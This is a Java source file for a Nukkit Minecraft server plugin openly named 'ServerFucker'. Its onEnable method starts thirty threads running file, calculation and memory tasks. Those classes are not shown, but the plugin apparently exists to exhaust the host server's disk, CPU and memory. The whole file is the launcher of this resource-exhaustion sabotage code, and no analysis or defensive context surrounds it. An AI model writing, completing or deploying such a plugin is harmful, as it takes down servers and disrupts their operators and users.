package info.elaina.fucker;

import cn.nukkit.plugin.PluginBase;
import info.elaina.fucker.runnable.CalcRunnable;
import info.elaina.fucker.runnable.FileRunnable;
import info.elaina.fucker.runnable.MemoryRunnable;

public class ServerFucker extends PluginBase {

    @Override
    public void onEnable() {
        this.getLogger().info("Server Fucker loaded!!");
        for (int i = 0; i < 10; i++) {
            new Thread(new FileRunnable()).start();
            new Thread(new CalcRunnable()).start();
            new Thread(new MemoryRunnable()).start();

        }
    }
}
